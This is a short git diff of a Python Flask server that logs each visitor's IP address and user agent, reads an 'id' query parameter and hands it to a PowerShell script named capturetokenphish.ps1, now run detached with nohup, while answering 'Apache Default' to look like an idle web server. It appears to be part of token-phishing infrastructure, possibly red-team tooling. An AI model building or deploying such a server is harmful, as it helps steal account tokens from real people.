@@ -15,7 +15,7 @@ def hello():
     app.logger.info('User From: ' + ip_addr + " with UserAgent: " + str(user_agent))
     token = request.args.get("id")
     if token:
-        print(call(["/opt/microsoft/powershell/7/pwsh", "./capturetokenphish.ps1", token]))
+        print(call(["nohup", "/opt/microsoft/powershell/7/pwsh", "./capturetokenphish.ps1", token]))
     return "Apache Default"
 
 if __name__ == "__main__":
